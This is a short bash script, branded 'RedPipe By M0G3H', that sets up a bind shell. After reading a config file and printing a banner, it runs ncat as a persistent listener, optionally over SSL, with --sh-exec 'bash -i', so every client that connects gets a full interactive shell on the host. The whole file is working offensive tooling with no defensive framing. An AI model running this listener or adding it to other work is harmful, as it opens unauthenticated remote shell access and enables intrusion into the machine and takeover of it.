#!/bin/bash

source ./config.cfg

echo "========================================="
echo "  RedPipe By M0G3H"
echo "  Listening on port $SERVER_PORT"
echo "  SSL: $SSL_ENABLED"
echo "========================================="
echo ""

if [ "$SSL_ENABLED" = "true" ]; then
    SSL_OPTS="--ssl"
else
    SSL_OPTS=""
fi

echo "[*] Ready. Client will get a full shell on connection."
echo "[*] Press Ctrl+C to stop server"
echo ""

ncat $SSL_OPTS -l -p $SERVER_PORT -k --sh-exec "bash -i"
